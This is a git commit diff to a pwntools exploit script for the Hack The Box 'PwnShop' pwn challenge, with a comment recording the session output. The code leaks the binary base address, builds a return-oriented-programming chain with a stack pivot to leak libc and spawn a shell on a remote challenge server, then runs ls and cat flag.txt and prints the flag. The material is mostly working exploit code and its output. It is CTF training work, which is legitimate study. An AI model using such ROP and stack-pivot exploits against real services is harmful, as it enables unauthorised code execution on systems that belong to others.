47da5474cbc4362e5d188121730d0cde4f3f2b65
ShundaZhang <zhangshunda@gmail.com>
2023-01-28 21:49:50 +0800

    Solved PwnShop!

--- ctf/pwn/PwnShop/dec.py
+++ ctf/pwn/PwnShop/dec.py
@@ -10,12 +10,12 @@ elf = ELF('./pwnshop')
 #io = gdb.debug('./pwnshop', 'break main')
 
 libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')
-ip, port = '165.232.104.184', 30745
+ip, port = '178.62.40.97', 32361
 io = remote(ip, port)
 
-io.sendlineafter('>', '2')
-io.sendlineafter('What do you wish to sell?', '1')
-io.sendlineafter('How much do you want for it?', '123456789')
+io.sendlineafter('> ', '2')
+io.sendlineafter('What do you wish to sell? ', '1')
+io.sendafter('How much do you want for it? ', '12345678')
 buf = io.recvline().split('? ')[1]
 elf_base = u64(buf[8:].ljust(8,'\x00')) - 0x40c0
 print hex(elf_base)
@@ -32,7 +32,7 @@ ret = elf_base + 0x132a
 #main = elf_base + 0x10a0
 
 io.sendlineafter('>', '1')
-padding = 'A'*(72-0x28+8)
+padding = 'A'*(72-0x28+8)   #72+8 -> 80, 80 - 0x28 -> 40
 payload = padding
 payload += p64(pop_rdi_ret)
 payload += p64(got_puts)
@@ -40,7 +40,7 @@ payload += p64(plt_puts)
 payload += p64(ret)
 payload += 'A'*(0x28-4*8-8)
 payload += p64(stack_pivot)
-io.sendlineafter('Enter details:', payload)
+io.sendafter('Enter details:', payload)
 buf = io.recvline().strip()
 
 print hex(u64(buf.ljust(8,'\x00')))
@@ -70,3 +70,38 @@ payload += p64(stack_pivot)
 io.sendafter('Enter details:', payload)
 
 io.interactive()
+
+'''
+Very tricky! 1) change sendlineafter() to sendafter(). 2) directly try remote part, and try several times!
+
+[*] Switching to interactive mode
+ $ ls
+[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0x16 bytes:
+    'core\n'
+    'flag.txt\n'
+    'pwnshop\n'
+core
+flag.txt
+pwnshop
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0x16 bytes:
+    'core\n'
+    'flag.txt\n'
+    'pwnshop\n'
+core
+flag.txt
+pwnshop
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    'cat flag.txt\n'
+[DEBUG] Received 0x26 bytes:
+    'HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}\n'
+HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}
+[*] Got EOF while reading in interactive
+$
+
+'''
